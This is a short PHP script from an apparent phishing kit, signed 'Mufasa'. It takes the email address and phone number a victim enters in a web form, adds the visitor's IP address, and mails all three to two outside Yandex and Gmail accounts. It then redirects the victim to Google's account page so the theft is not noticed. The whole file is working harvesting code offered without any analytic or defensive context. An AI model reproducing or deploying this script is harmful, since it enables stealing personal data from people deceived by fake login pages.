﻿<?

$ip = getenv("REMOTE_ADDR");
$message .= "============mufasa==========\n";
$message .= "email: ".$_POST['emailAnswer']."\n";
$message .= "Phone: ".$_POST['phone']."\n";
$message .= "IP: ".$ip."\n";
$message .= "=======editted by Mufasa=====\n";



$recipient = "ddonwise10@yandex.com, g.2sulukdze@gmail.com,";
$subject = "RAIN-OF-GRACE";
$headers = "RAIN";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:http://myaccount.google.com");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>